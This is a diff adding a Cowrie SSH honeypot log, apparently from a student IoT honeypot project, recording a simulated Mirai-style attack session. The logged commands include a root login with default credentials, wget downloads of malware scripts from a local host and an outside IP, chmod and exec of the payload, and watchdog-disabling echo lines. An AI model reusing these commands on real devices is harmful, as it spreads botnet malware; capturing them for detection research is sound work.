@@ -1,0 +1,116 @@
+2026-04-11T15:25:44.243857+0100 [-] Reading configuration from ['/home/franek/IoT-Honeypot-for-Detecting-Attacks/Honeypot Project/vanilla-honeypot/cowrie/etc/cowrie.cfg.dist', '/home/franek/IoT-Honeypot-for-Detecting-Attacks/Honeypot Project/vanilla-honeypot/cowrie/etc/cowrie.cfg']
+2026-04-11T15:25:44.500944+0100 [-] [ WARNING ] uname.py: Unable to load device profiles e: No module named 'device_profiles'
+2026-04-11T15:25:44.584880+0100 [-] Python Version 3.12.3 (main, Mar  3 2026, 12:15:18) [GCC 13.3.0]
+2026-04-11T15:25:44.584899+0100 [-] Twisted Version 25.5.0
+2026-04-11T15:25:44.584906+0100 [-] Cowrie Version 2.9.9.dev1+g7d81de406
+2026-04-11T15:25:44.584911+0100 [-] Sensor UUID: 20b89e73-faba-11f0-9b63-0800274bb99a
+2026-04-11T15:25:44.587910+0100 [-] Loaded output engine: jsonlog
+2026-04-11T15:25:44.590135+0100 [-] Loaded output engine: textlog
+2026-04-11T15:25:44.591016+0100 [twisted.scripts._twistd_unix.UnixAppLogger#info] twistd 25.5.0 (/home/franek/IoT-Honeypot-for-Detecting-Attacks/Honeypot Project/vanilla-honeypot/cowrie/cowrie-env/bin/python 3.12.3) starting up.
+2026-04-11T15:25:44.591080+0100 [twisted.scripts._twistd_unix.UnixAppLogger#info] reactor class: twisted.internet.epollreactor.EPollReactor.
+2026-04-11T15:25:44.596962+0100 [-] CowrieSSHFactory starting on 2222
+2026-04-11T15:25:44.597354+0100 [cowrie.ssh.factory.CowrieSSHFactory#info] Starting factory <cowrie.ssh.factory.CowrieSSHFactory object at 0x79d6344b8470>
+2026-04-11T15:25:44.637673+0100 [-] [DEVICE PROFILES] Using SSH banner: SSH-2.0-dropbear_2020.81
+2026-04-11T15:25:44.637802+0100 [-] [DEVICE PROFILES] Using SSH banner: SSH-2.0-dropbear_2020.79
+2026-04-11T15:25:44.637870+0100 [-] Ready to accept SSH connections
+2026-04-11T15:26:05.247640+0100 [cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha1
+2026-04-11T15:26:05.247836+0100 [cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha256
+2026-04-11T15:26:05.248719+0100 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 127.0.0.1:52842 (127.0.0.1:2222) [session: 6bad3fe1d721]
+2026-04-11T15:26:05.251323+0100 [HoneyPotSSHTransport,0,127.0.0.1] Remote SSH version: SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.15
+2026-04-11T15:26:05.253206+0100 [HoneyPotSSHTransport,0,127.0.0.1] SSH client hassh fingerprint: aae6b9604f6f3356543709a376d7f657
+2026-04-11T15:26:05.254009+0100 [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ssh-ed25519'
+2026-04-11T15:26:05.254065+0100 [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2026-04-11T15:26:05.254114+0100 [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2026-04-11T15:26:05.297237+0100 [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2026-04-11T15:26:05.298098+0100 [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2026-04-11T15:26:05.299029+0100 [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'none'
+2026-04-11T15:26:05.901834+0100 [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'
+2026-04-11T15:26:05.902156+0100 [HoneyPotSSHTransport,0,127.0.0.1] Could not read etc/userdb.txt, default database activated
+2026-04-11T15:26:05.902426+0100 [HoneyPotSSHTransport,0,127.0.0.1] login attempt [b'root'/b'admin'] succeeded
+2026-04-11T15:26:05.903050+0100 [HoneyPotSSHTransport,0,127.0.0.1] Initialized emulated server as architecture: linux-mipsel-lsb
+2026-04-11T15:26:05.903186+0100 [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' authenticated with b'password'
+2026-04-11T15:26:05.903339+0100 [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-connection'
+2026-04-11T15:26:05.903913+0100 [cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'session' request
+2026-04-11T15:26:05.904472+0100 [HoneyPotSSHTransport,0,127.0.0.1] Assigned device profile: dlink_dcs5020l_camera (DCS-5020L) [instance: vanilla-honeypot]
+2026-04-11T15:26:05.905030+0100 [cowrie.ssh.session.HoneyPotSSHSession#info] channel open
+2026-04-11T15:26:05.927563+0100 [twisted.conch.ssh.session#info] Handling pty request: b'xterm-256color' (44, 102, 0, 0)
+2026-04-11T15:26:05.927893+0100 [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,0,127.0.0.1] Terminal Size: 102 44
+2026-04-11T15:26:05.928719+0100 [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,0,127.0.0.1] request_env: LC_ADDRESS=en_GB.UTF-8
+2026-04-11T15:26:05.929153+0100 [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,0,127.0.0.1] request_env: LC_NAME=en_GB.UTF-8
+2026-04-11T15:26:05.929655+0100 [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,0,127.0.0.1] request_env: LC_MONETARY=en_GB.UTF-8
+2026-04-11T15:26:05.930014+0100 [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,0,127.0.0.1] request_env: LC_PAPER=en_GB.UTF-8
+2026-04-11T15:26:05.930354+0100 [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,0,127.0.0.1] request_env: LANG=en_GB.UTF-8
+2026-04-11T15:26:05.930878+0100 [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,0,127.0.0.1] request_env: LC_IDENTIFICATION=en_GB.UTF-8
+2026-04-11T15:26:05.931225+0100 [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,0,127.0.0.1] request_env: LC_TELEPHONE=en_GB.UTF-8
+2026-04-11T15:26:05.931655+0100 [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,0,127.0.0.1] request_env: LC_MEASUREMENT=en_GB.UTF-8
+2026-04-11T15:26:05.932009+0100 [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,0,127.0.0.1] request_env: LC_TIME=en_GB.UTF-8
+2026-04-11T15:26:05.932357+0100 [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,0,127.0.0.1] request_env: LC_NUMERIC=en_GB.UTF-8
+2026-04-11T15:26:05.932950+0100 [twisted.conch.ssh.session#info] Getting shell
+2026-04-11T15:26:06.610116+0100 [HoneyPotSSHTransport,0,127.0.0.1] CMD: wget http://10.0.2.15:8888/tp_camera_mirai_gafgyt_2f8dcc5f.sh -O /tmp/dvrhelper
+2026-04-11T15:26:06.610838+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: wget http://10.0.2.15:8888/tp_camera_mirai_gafgyt_2f8dcc5f.sh -O /tmp/dvrhelper
+2026-04-11T15:26:06.611182+0100 [HoneyPotSSHTransport,0,127.0.0.1] [network] 10.0.2.15 is whitelisted in allowed_payload_hosts — allowing
+2026-04-11T15:26:06.617886+0100 [twisted.web.client._HTTP11ClientFactory#info] Starting factory _HTTP11ClientFactory(<function HTTPConnectionPool._newConnection.<locals>.quiescentCallback at 0x79d632f1a340>, <HostnameEndpoint 10.0.2.15:8888>)
+2026-04-11T15:26:06.625237+0100 [HTTP11ClientProtocol,client] Downloaded URL (http://10.0.2.15:8888/tp_camera_mirai_gafgyt_2f8dcc5f.sh) with SHA-256 74feb2ce240a8145252d574edb6d7638c3536f173f3ccf959dfa247d664b6e42 to var/lib/cowrie/downloads/74feb2ce240a8145252d574edb6d7638c3536f173f3ccf959dfa247d664b6e42
+2026-04-11T15:26:06.625896+0100 [twisted.web.client._HTTP11ClientFactory#info] Stopping factory _HTTP11ClientFactory(<function HTTPConnectionPool._newConnection.<locals>.quiescentCallback at 0x79d632f1a340>, <HostnameEndpoint 10.0.2.15:8888>)
+2026-04-11T15:26:10.725821+0100 [HoneyPotSSHTransport,0,127.0.0.1] CMD: chmod 777 /tmp/dvrhelper 
+2026-04-11T15:26:10.726443+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: chmod 777 /tmp/dvrhelper
+2026-04-11T15:26:14.570831+0100 [HoneyPotSSHTransport,0,127.0.0.1] CMD: exec /tmp/dvrhelper 
+2026-04-11T15:26:14.571299+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: exec /tmp/dvrhelper
+2026-04-11T15:26:14.572494+0100 [HoneyPotSSHTransport,0,127.0.0.1] [exec.py] Replaying 37 commands from /home/franek/IoT-Honeypot-for-Detecting-Attacks/Honeypot Project/attacker-simulator/payloads/LZRD_mirai_mips_bf58bd0b.sh
+2026-04-11T15:26:14.572629+0100 [HoneyPotSSHTransport,0,127.0.0.1] CMD: echo '' > /dev/watchdog; echo '' > /dev/misc/watchdog; echo '' > /dev/watchdog0; echo '' > /sbin/watchdog; echo '' > /bin/watchdog; cat /proc/430/cmdline; cat /proc/656/cmdline; cat /proc/671/cmdline; cat /proc/673/cmdline; cat /proc/677/cmdline; cat /proc/678/cmdline; cat /proc/698/cmdline; cat /proc/699/cmdline; cat /proc/704/cmdline; cat /proc/706/cmdline; cat /proc/707/cmdline; cat /proc/709/cmdline; cat /proc/714/cmdline; cat /proc/726/cmdline; cat /proc/734/cmdline; cat /proc/742/cmdline; cat /proc/743/cmdline; cat /proc/754/cmdline; cat /proc/767/cmdline; cat /proc/771/cmdline; cat /proc/776/cmdline; cat /proc/777/cmdline; cat /proc/779/cmdline; cat /proc/791/cmdline; cat /proc/803/cmdline; cat /proc/815/cmdline; cat /proc/816/cmdline; cat /proc/819/cmdline; cat /proc/822/cmdline; wget http://38.247.134.212:3778/; wget http://38.247.134.212:3778/; wget http://38.247.134.212:3778/
+2026-04-11T15:26:14.573639+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: echo 
+2026-04-11T15:26:14.574400+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: echo 
+2026-04-11T15:26:14.574755+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: echo 
+2026-04-11T15:26:14.575280+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: echo 
+2026-04-11T15:26:14.576087+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: echo 
+2026-04-11T15:26:14.576721+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: cat /proc/430/cmdline
+2026-04-11T15:26:14.577018+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: cat /proc/656/cmdline
+2026-04-11T15:26:14.577251+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: cat /proc/671/cmdline
+2026-04-11T15:26:14.577604+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: cat /proc/673/cmdline
+2026-04-11T15:26:14.578175+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: cat /proc/677/cmdline
+2026-04-11T15:26:14.578648+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: cat /proc/678/cmdline
+2026-04-11T15:26:14.578870+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: cat /proc/698/cmdline
+2026-04-11T15:26:14.579092+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: cat /proc/699/cmdline
+2026-04-11T15:26:14.579334+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: cat /proc/704/cmdline
+2026-04-11T15:26:14.579695+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: cat /proc/706/cmdline
+2026-04-11T15:26:14.579911+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: cat /proc/707/cmdline
+2026-04-11T15:26:14.580150+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: cat /proc/709/cmdline
+2026-04-11T15:26:14.580308+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: cat /proc/714/cmdline
+2026-04-11T15:26:14.580679+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: cat /proc/726/cmdline
+2026-04-11T15:26:14.580896+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: cat /proc/734/cmdline
+2026-04-11T15:26:14.581103+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: cat /proc/742/cmdline
+2026-04-11T15:26:14.581320+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: cat /proc/743/cmdline
+2026-04-11T15:26:14.581804+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: cat /proc/754/cmdline
+2026-04-11T15:26:14.582115+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: cat /proc/767/cmdline
+2026-04-11T15:26:14.582333+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: cat /proc/771/cmdline
+2026-04-11T15:26:14.582665+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: cat /proc/776/cmdline
+2026-04-11T15:26:14.582894+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: cat /proc/777/cmdline
+2026-04-11T15:26:14.583103+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: cat /proc/779/cmdline
+2026-04-11T15:26:14.583325+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: cat /proc/791/cmdline
+2026-04-11T15:26:14.583478+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: cat /proc/803/cmdline
+2026-04-11T15:26:14.583865+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: cat /proc/815/cmdline
+2026-04-11T15:26:14.584081+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: cat /proc/816/cmdline
+2026-04-11T15:26:14.584305+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: cat /proc/819/cmdline
+2026-04-11T15:26:14.584645+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: cat /proc/822/cmdline
+2026-04-11T15:26:14.584800+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: wget http://38.247.134.212:3778/
+2026-04-11T15:26:14.586702+0100 [HoneyPotSSHTransport,0,127.0.0.1] Command found: wget http://38.247.134.212:3778/
+2026-04-11T15:26:14.587817+0100 [twisted.web.client._HTTP11ClientFactory#info] Starting factory _HTTP11ClientFactory(<function HTTPConnectionPool._newConnection.<locals>.quiescentCallback at 0x79d633250040>, <HostnameEndpoint 38.247.134.212:3778>)
+2026-04-11T15:26:14.588879+0100 [twisted.web.client._HTTP11ClientFactory#info] Starting factory _HTTP11ClientFactory(<function HTTPConnectionPool._newConnection.<locals>.quiescentCallback at 0x79d632f19120>, <HostnameEndpoint 38.247.134.212:3778>)
+2026-04-11T15:26:24.587999+0100 [twisted.web.client._HTTP11ClientFactory#info] Stopping factory _HTTP11ClientFactory(<function HTTPConnectionPool._newConnection.<locals>.quiescentCallback at 0x79d633250040>, <HostnameEndpoint 38.247.134.212:3778>)
+2026-04-11T15:26:24.588750+0100 [twisted.web.client._HTTP11ClientFactory#info] Stopping factory _HTTP11ClientFactory(<function HTTPConnectionPool._newConnection.<locals>.quiescentCallback at 0x79d632f19120>, <HostnameEndpoint 38.247.134.212:3778>)
+2026-04-11T15:26:24.589167+0100 [-] Command found: wget http://38.247.134.212:3778/
+2026-04-11T15:26:24.590631+0100 [twisted.web.client._HTTP11ClientFactory#info] Starting factory _HTTP11ClientFactory(<function HTTPConnectionPool._newConnection.<locals>.quiescentCallback at 0x79d632f1bc40>, <HostnameEndpoint 38.247.134.212:3778>)
+2026-04-11T15:26:34.591675+0100 [twisted.web.client._HTTP11ClientFactory#info] Stopping factory _HTTP11ClientFactory(<function HTTPConnectionPool._newConnection.<locals>.quiescentCallback at 0x79d632f1bc40>, <HostnameEndpoint 38.247.134.212:3778>)
+2026-04-11T15:26:36.294678+0100 [twisted.internet.base#info] Received SIGTERM, shutting down.
+2026-04-11T15:26:36.295141+0100 [-] (TCP Port 2222 Closed)
+2026-04-11T15:26:36.295241+0100 [cowrie.ssh.factory.CowrieSSHFactory#info] Stopping factory <cowrie.ssh.factory.CowrieSSHFactory object at 0x79d6344b8470>
+2026-04-11T15:26:36.295869+0100 [HoneyPotSSHTransport,0,127.0.0.1] Saved redir contents with SHA-256 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b to var/lib/cowrie/downloads/01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b
+2026-04-11T15:26:36.296619+0100 [HoneyPotSSHTransport,0,127.0.0.1] Saved redir contents with SHA-256 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b to var/lib/cowrie/downloads/01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b
+2026-04-11T15:26:36.296951+0100 [HoneyPotSSHTransport,0,127.0.0.1] Saved redir contents with SHA-256 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b to var/lib/cowrie/downloads/01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b
+2026-04-11T15:26:36.297555+0100 [HoneyPotSSHTransport,0,127.0.0.1] Saved redir contents with SHA-256 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b to var/lib/cowrie/downloads/01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b
+2026-04-11T15:26:36.298131+0100 [HoneyPotSSHTransport,0,127.0.0.1] Closing TTY Log: var/lib/cowrie/tty/58a8288d68517856bf5ed3f84244e4f8ce5d4d0c720e9bfab0ab5d68714ff1eb after 30.4 seconds
+2026-04-11T15:26:36.298469+0100 [HoneyPotSSHTransport,0,127.0.0.1] avatar root logging out
+2026-04-11T15:26:36.298511+0100 [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-04-11T15:26:36.298546+0100 [HoneyPotSSHTransport,0,127.0.0.1] Connection lost after 31.0 seconds
+2026-04-11T15:26:36.299633+0100 [twisted.internet.base#info] Main loop terminated.
+2026-04-11T15:26:36.299806+0100 [twisted.scripts._twistd_unix.UnixAppLogger#info] Server Shut Down.
